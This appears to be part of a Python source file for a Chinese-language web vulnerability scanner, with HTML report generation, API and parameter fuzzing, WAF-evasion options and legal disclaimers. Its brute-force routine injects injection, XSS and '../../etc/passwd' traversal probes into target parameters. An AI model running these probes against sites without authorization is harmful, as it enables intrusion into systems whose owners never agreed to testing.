        .header {{ text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #3498db; }}
        .summary {{ background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
        .summary-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }}
        .summary-item {{ background-color: #fff; padding: 15px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }}
        .summary-item.critical {{ border-top: 4px solid #e74c3c; }}
        .summary-item.high {{ border-top: 4px solid #e67e22; }}
        .summary-item.medium {{ border-top: 4px solid #f1c40f; }}
        .summary-item.low {{ border-top: 4px solid #2ecc71; }}
        .tech-stack {{ margin-bottom: 30px; }}
        .tech-stack ul {{ list-style-type: none; padding: 0; }}
        .tech-stack li {{ display: inline-block; background-color: #3498db; color: white; padding: 5px 10px; border-radius: 4px; margin-right: 10px; margin-bottom: 5px; }}
        .vulnerabilities {{ margin-bottom: 40px; }}
        .vuln-section {{ margin-bottom: 30px; }}
        .vuln-section h3 {{ padding: 10px; background-color: #ecf0f1; border-left: 4px solid #3498db; cursor: pointer; }}
        .vuln-section-content {{ display: none; padding: 10px; border-left: 3px solid #3498db; background-color: #f9f9f9; }}
        .vuln-item {{ background-color: #fff; padding: 20px; margin-bottom: 20px; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }}
        .vuln-item.critical {{ border-left: 4px solid #e74c3c; }}
        .vuln-item.high {{ border-left: 4px solid #e67e22; }}
        .vuln-item.medium {{ border-left: 4px solid #f1c40f; }}
        .vuln-item.low {{ border-left: 4px solid #2ecc71; }}
        .severity-label {{ padding: 3px 8px; border-radius: 4px; color: white; font-weight: bold; }}
        .critical-label {{ background-color: #e74c3c; }}
        .high-label {{ background-color: #e67e22; }}
        .medium-label {{ background-color: #f1c40f; }}
        .low-label {{ background-color: #2ecc71; }}
        pre {{ background-color: #f8f9fa; padding: 15px; border-radius: 6px; overflow-x: auto; }}
        .timestamp {{ text-align: right; color: #7f8c8d; font-size: 0.9em; }}
        .vuln-group {{ margin-bottom: 30px; }}
        .vuln-group-header {{ background-color: #ecf0f1; padding: 10px; border-left: 4px solid #3498db; font-weight: bold; cursor: pointer; }}
        .vuln-group-content {{ display: none; padding: 10px; }}
        .vuln-group.expanded .vuln-group-content {{ display: block; }}
    </style>
    <script>
        function toggleVulnGroup(element) {{
            const group = element.parentElement;
            group.classList.toggle('expanded');
        }}
        
        function toggleSection(element) {{
            const section = element.parentElement;
            const content = section.querySelector('.vuln-section-content');
            if (content.style.display === 'none') {{
                content.style.display = 'block';
            }} else {{
                content.style.display = 'none';
            }}
        }}
    </script>
</head>
<body>
    <div class="header">
        <h1>Web安全扫描报告</h1>
        <h2>目标: {self.target_url}</h2>
    </div>
    
    <div class="summary">
        <h2>扫描概览</h2>
        <div class="summary-grid">
            <div class="summary-item critical">
                <h3>严重漏洞</h3>
                <p>{sum(len(v) for k, v in classified_vulns.items() if CONFIG['vulnerability_categories'].get(k, '') == 'critical')}</p>
            </div>
            <div class="summary-item high">
                <h3>高危漏洞</h3>
                <p>{sum(len(v) for k, v in classified_vulns.items() if CONFIG['vulnerability_categories'].get(k, '') == 'high')}</p>
            </div>
            <div class="summary-item medium">
                <h3>中危漏洞</h3>
                <p>{sum(len(v) for k, v in classified_vulns.items() if CONFIG['vulnerability_categories'].get(k, '') == 'medium')}</p>
            </div>
            <div class="summary-item low">
                <h3>低危漏洞</h3>
                <p>{sum(len(v) for k, v in classified_vulns.items() if CONFIG['vulnerability_categories'].get(k, '') == 'low')}</p>
            </div>
        </div>
        
        <p><strong>扫描时间:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p><strong>总请求数:</strong> {self.scanner.stats["requests_sent"]}</p>
        <p><strong>扫描时长:</strong> {time.time() - self.start_time:.2f} 秒</p>
    </div>
    
    <div class="tech-stack">
        <h2>检测到的技术栈</h2>
        <ul>
"""
        
        # 添加技术栈
        for tech in self.tech_stack.keys():
            report += f"<li>{tech}</li>"
        
        report += """
        </ul>
    </div>
    
    <div class="vulnerabilities">
        <h2>漏洞详情</h2>
"""
        
        # 按漏洞类型分组展示
        for vuln_type, vulns in classified_vulns.items():
            if not vulns:
                continue
                
            severity = CONFIG["vulnerability_categories"].get(vuln_type, "medium")
            severity_label = {
                "critical": "严重",
                "high": "高危",
                "medium": "中危",
                "low": "低危"
            }.get(severity, "中危")
            
            report += f"""
        <div class="vuln-section">
            <h3 onclick="toggleSection(this)">{severity_label} - {vuln_type} ({len(vulns)}个漏洞) <span style="font-size:0.8em;color:#777;">(点击展开/折叠)</span></h3>
            <div class="vuln-section-content">
"""
            
            for i, vuln in enumerate(vulns, 1):
                # 处理可能的None值
                payload = vuln.get('payload', '')
                reproduce = vuln.get('reproduce', '')
                remediation = vuln.get('remediation', '暂无')
                response_text = vuln.get('response', '').text[:500] + "..." if hasattr(vuln.get('response', ''), 'text') and len(vuln['response'].text) > 500 else (vuln.get('response', '').text if hasattr(vuln.get('response', ''), 'text') else '')
                
                report += f"""
                <div class="vuln-item {severity}">
                    <h4>{vuln_type} #{i}</h4>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>方法:</strong> {vuln['method']}</p>
                    <p><strong>状态码:</strong> {vuln['status']}</p>
                    <p><strong>严重性:</strong> <span class="severity-label {severity}-label">{vuln['severity']}</span></p>
                    <p><strong>Payload:</strong> <code>{html.escape(payload)}</code></p>
                    <p><strong>验证状态:</strong> {"已验证" if vuln.get('validated', False) else "未验证"} ({vuln.get('confidence', '中')}置信度)</p>
                    <p><strong>重现步骤:</strong> {reproduce}</p>
                    <p><strong>修复建议:</strong> {remediation}</p>
                    <p><strong>响应摘要:</strong> <pre>{html.escape(response_text)}</pre></p>
                </div>
"""
            
            report += "            </div>"  # 关闭vuln-section-content
            report += "        </div>"  # 关闭vuln-section
        
        report += """
    </div>  <!-- 关闭vulnerabilities -->
    
    <div class="timestamp">
        报告生成时间: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """ 
    </div>
</body>
</html>
"""
        
        # 保存报告
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(report)
        
        return report_path
    
    def analyze_api_endpoint(self, endpoint):
        """分析API端点"""
        full_url = urljoin(self.target_url, endpoint)
        
        # 测试API端点
        methods = ["GET", "POST", "PUT", "DELETE"] if self.api_scan else ["GET"]
        api_info = {
            "endpoint": full_url,
            "methods": {},
            "vulnerabilities": []
        }
        
        for method in methods:
            try:
                self.adaptive_rate_limiting()
                response = self.scanner.send_request(full_url, method)
                if not response:
                    continue
                    
                api_info["methods"][method] = response.status_code
                
                # 测试API漏洞
                if response.status_code < 400:
                    for param in API_PARAMS:
                        for vuln_type, vuln_data in VULNERABILITY_CHECKS.items():
                            if method not in vuln_data["methods"]:
                                continue
                                
                            for payload in vuln_data["payloads"][:3]:  # 快速模式只测试前3个
                                test_params = {param: payload}
                                self.adaptive_rate_limiting()
                                
                                # 发送测试请求
                                test_response = self.scanner.send_request(full_url, method, test_params)
                                if not test_response:
                                    continue
                                    
                                # 检查漏洞特征
                                for pattern in vuln_data["patterns"]:
                                    if re.search(pattern, test_response.text, re.IGNORECASE):
                                        api_info["vulnerabilities"].append({
                                            "endpoint": full_url,
                                            "method": method,
                                            "parameter": param,
                                            "type": vuln_type,
                                            "payload": payload,
                                            "status": test_response.status_code,
                                            "severity": vuln_data["severity"]
                                        })
                                        break
            except Exception as e:
                continue
                
        return api_info
    
    def bruteforce_parameters(self):
        """参数暴力破解"""
        # 在实际应用中，这里应该使用更全面的参数列表
        for url_info in self.found_paths[:100]:  # 限制数量防止过多
            url = url_info["url"]
            parsed = urlparse(url)
            
            for param in CONFIG["common_params"]:
                for payload in ["'", "<script>alert(1)</script>", "../../etc/passwd"]:
                    test_url = url + (f"&{param}={payload}" if "?" in url else f"?{param}={payload}")
                    
                    try:
                        self.adaptive_rate_limiting()
                        response = self.scanner.send_request(test_url)
                        if not response:
                            continue
                            
                        # 检查响应中是否有漏洞迹象
                        if response.status_code == 500 or (response.text and any(keyword in response.text for keyword in ["error", "exception", "warning"])):
                            self.vulnerabilities.append({
                                "url": test_url,
                                "type": "参数注入",
                                "payload": payload,
                                "method": "GET",
                                "status": response.status_code,
                                "reproduce": f"访问URL: {test_url}",
                                "severity": "中危",
                                "category": "参数漏洞",
                                "validated": False,
                                "confidence": "中"
                            })
                    except:
                        pass
    
    def show_progress(self):
        """显示扫描进度 - 修复版本"""
        start_time = time.time()
        last_completed = 0
        
        while self.scan_active and self.total_tests > 0:
            with self.progress_lock:
                completed = self.completed_tests
            
            # 计算进度百分比
            progress = completed / self.total_tests * 100 if self.total_tests > 0 else 0
            
            # 计算速度（请求/秒）
            elapsed_time = time.time() - start_time
            if elapsed_time > 0:
                speed = (completed - last_completed) / elapsed_time
            else:
                speed = 0
            last_completed = completed
            
            # 计算剩余时间
            if speed > 0:
                remaining = (self.total_tests - completed) / speed
            else:
                remaining = 0
            
            # 获取资源使用情况
            usage = self.get_resource_usage()
            
            # 格式化输出
            print(f"{Fore.YELLOW}[*] 进度: {progress:.1f}% | 完成: {completed}/{self.total_tests} | 速度: {speed:.1f} req/s | 剩余时间: {self.format_time(remaining)} | CPU: {usage['cpu']:.1f}% | 内存: {usage['memory']:.1f}%", end='\r')
            
            # 重置计时器
            start_time = time.time()
            time.sleep(1)
        
        print(f"{Fore.GREEN}\n[*] 进度: 100.0% | 完成: {self.total_tests}/{self.total_tests} | 速度: 0.0 req/s | 剩余时间: 0s")
    
    def format_time(self, seconds):
        """格式化时间显示"""
        if seconds < 60:
            return f"{int(seconds)}秒"
        elif seconds < 3600:
            minutes = seconds // 60
            seconds = seconds % 60
            return f"{int(minutes)}分{int(seconds)}秒"
        else:
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            return f"{int(hours)}时{int(minutes)}分"

def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description='Web安全扫描工具')
    parser.add_argument('target', help='目标URL')
    parser.add_argument('--proxy', help='使用代理服务器 (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--rate', type=float, default=0.05, 
                        help='请求之间的延迟(秒) (默认: 0.05)')
    parser.add_argument('--no-waf', action='store_true', 
                        help='禁用WAF规避技术')
    parser.add_argument('--no-api', action='store_true', 
                        help='禁用API扫描')
    parser.add_argument('--no-js', action='store_true', 
                        help='禁用JS分析')
    parser.add_argument('--fast', action='store_true', 
                        help='启用快速扫描模式')
    parser.add_argument('--full', action='store_true', 
                        help='启用完整扫描模式（禁用快速模式）')
    parser.add_argument('--threads', type=int, default=50,
                        help='最大线程数 (默认: 50)')
    args = parser.parse_args()
    
    # 更新配置
    CONFIG["max_threads"] = args.threads
    CONFIG["rate_limit"] = args.rate
    
    # 显示banner
    print_banner()
    
    # 配置扫描选项
    full_scan = args.full
    waf_evasion = not args.no_waf
    api_scan = not args.no_api and (full_scan or not args.no_api)
    js_analysis = not args.no_js and (full_scan or not args.no_js)
    sensitive_data = full_scan
    bruteforce_params = full_scan
    tech_detection = True
    
    # 初始化扫描器
    scanner = AdvancedSecurityScanner(
        target_url=args.target,
        proxy=args.proxy,
        rate_limit=args.rate,
        waf_evasion=waf_evasion,
        api_scan=api_scan,
        js_analysis=js_analysis,
        sensitive_data=sensitive_data,
        bruteforce_params=bruteforce_params,
        tech_detection=tech_detection
    )
    
    # 配置快速扫描模式
    CONFIG["fast_mode"] = args.fast
    
    try:
        # 执行扫描
        print(f"{Fore.CYAN}[*] 开始扫描: {args.target}")
        print(f"{Fore.CYAN}[*] 配置参数: 线程数={CONFIG['max_threads']}, 延迟={CONFIG['rate_limit']}秒, 快速模式={'是' if CONFIG['fast_mode'] else '否'}")
        
        paths_found = scanner.scan_paths()
        
        if paths_found > 0:
            scanner.detect_vulnerabilities()
        
        # 生成报告
        report_path = scanner.generate_html_report()
        
        # 性能统计
        total_time = time.time() - scanner.start_time
        rps = scanner.scanner.stats["requests_sent"] / total_time if total_time > 0 else 0
        
        print(f"\n{Fore.GREEN}[+] 扫描完成! 报告已保存至: {report_path}")
        print(f"{Fore.CYAN}[*] 扫描统计: ")
        print(f"    - 测试路径: {scanner.total_tests}")
        print(f"    - 有效路径: {len(scanner.found_paths)}")
        print(f"    - 分析JS文件: {len(scanner.js_files)}")
        print(f"    - 发现API端点: {len(scanner.api_endpoints)}")
        print(f"    - 发现漏洞: {len(scanner.vulnerabilities)}")
        validated_count = sum(1 for v in scanner.vulnerabilities if v.get('validated', False))
        print(f"    - 已验证漏洞: {validated_count}")
        print(f"    - 识别技术栈: {', '.join(scanner.tech_stack.keys())}")
        print(f"    - 总请求数: {scanner.scanner.stats['requests_sent']}")
        print(f"    - 请求速率: {rps:.2f} 请求/秒")
        print(f"    - 扫描耗时: {total_time:.2f} 秒")
        print(f"{Fore.RED}[!] 法律声明: 本工具仅用于授权测试，使用前请确保您有合法权限{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] 扫描被用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] 发生错误: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

def print_banner():
    print(f"""{Fore.CYAN}
    ╔═╗┬─┐┌─┐┌─┐┌┬┐┌─┐┬─┐  ╔═╗┌─┐┌─┐┌┬┐┌─┐┌┬┐┌─┐┬─┐
    ╠═╝├┬┘├┤ ├─┤ │ ├┤ ├┬┘  ╚═╗│  ├─┤ │ ├┤ │││├┤ ├┬┘
    ╩  ┴└─└─┘┴ ┴ ┴ └─┘┴└─  ╚═╝└─┘┴ ┴ ┴ └─┘┴ ┴└─┘┴└─
    作者:火龙果小泽
    交流群:907265438
    {Style.RESET_ALL}""")
    print(f"{Fore.YELLOW}Web安全扫描工具 v5.0{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}高级漏洞检测 | 智能上下文感知 | 多维度验证 | 专业报告{Style.RESET_ALL}\n")
    print(f"{Fore.RED}法律声明: 仅限授权测试使用，未经授权扫描属于违法行为{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}升级特性:")
    print("  - 高级WAF绕过技术")
    print("  - 智能页面去重技术")
    print("  - 动态线程调整算法")
    print("  - 连接池复用优化")
    print("  - 响应缓存加速扫描")
    print("  - 自适应速率控制")
    print("  - 资源感知调度")
    print(f"  - 批量处理优化{Style.RESET_ALL}\n")

if __name__ == "__main__":
    main()